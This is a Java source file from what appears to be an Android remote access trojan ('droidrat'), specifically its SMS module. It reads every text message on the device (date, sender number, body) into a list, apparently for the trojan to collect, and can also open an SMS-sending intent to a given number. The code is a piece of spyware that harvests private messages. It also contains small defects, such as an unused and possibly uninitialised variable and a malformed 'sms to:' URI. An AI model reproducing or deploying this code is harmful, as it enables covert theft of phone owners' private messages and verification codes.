package com.je_chen.droidrat_je.rat.modules.appintent.sms;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class SMS {

    public List<String> getAllSms(Context context) {
        List<String> smsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (cursor != null) {
            totalSMS = cursor.getCount();
            if (cursor.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    Date dateFormat = new Date(Long.parseLong(smsDate));
                    String type;
                    switch (Integer.parseInt(cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }
                    smsList.add(smsDate + ":");
                    smsList.add(number + ":");
                    smsList.add(body + ":");
                    cursor.moveToNext();
                }
            }
            cursor.close();
        }
        return smsList;
    }

    public void sendSMS(Context context, String mobileNumber, String smsText) {
        Intent intent = new Intent(Intent.ACTION_SENDTO, Uri.parse("sms to:" + mobileNumber));
        intent.putExtra("sms_body", smsText);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
